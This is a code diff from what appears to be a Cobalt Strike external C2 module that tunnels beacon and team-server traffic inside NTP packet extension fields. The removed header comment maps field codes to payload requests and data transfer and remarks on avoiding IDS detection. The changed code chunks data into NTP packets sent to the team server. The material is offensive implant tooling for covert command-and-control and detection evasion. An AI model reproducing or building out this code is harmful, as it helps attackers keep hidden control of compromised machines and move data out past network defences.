@@ -2,20 +2,7 @@
 
 CS-EXTC2-NTP
 
-
-Extension Field Key:
-
-0x4d, 0x5a: Give me a payload. When the server sees this, a payload will be sent back
-	> This should likely change. 0x4d, 0x5a has a great chance at getting picked up as a "binary" by IDS tools
-
-0xAA,0xBB: Getting team server data from server to go to beacon
-0xBB,0xAA: Sending beacon data back to server
-
-
 */
-
-
-
 #include <iostream>
 #include "createntp.hpp"
 #include "parsentp.hpp"
@@ -89,10 +76,13 @@ std::vector<uint8_t> chunker(std::vector<uint8_t> data, std::array < uint8_t, 2>
 			extensionField, //NtpExtensionField::giveMePayload,
 			chunkData
 		);
+
 		//pass full ntp packet 
 		std::vector < uint8_t> packet_bytes = packet.getPacket();
 		//placeholder, should return a vector, of the full NTP packet
 		std::vector<uint8_t> response = sendChunk(packet_bytes);
+		//run the debugger directly on the incoming respnose packet
+		//packetDebugger(response);
 
 		//Parse NTP packet, get data out of it (or whatever else is needed)
 		NTPPacketParser packetParser = NTPPacketParser(response);
@@ -146,7 +136,7 @@ int main() {
 	//print full packet
 	//packet.printPacket();
 	printHexVectorPacket(packet_bytes);
-	chunker(packet_bytes, NtpExtensionField::sendDataToTeamserver);
+	chunker(packet_bytes, NtpExtensionField::dataForTeamserver);
 
 }
 
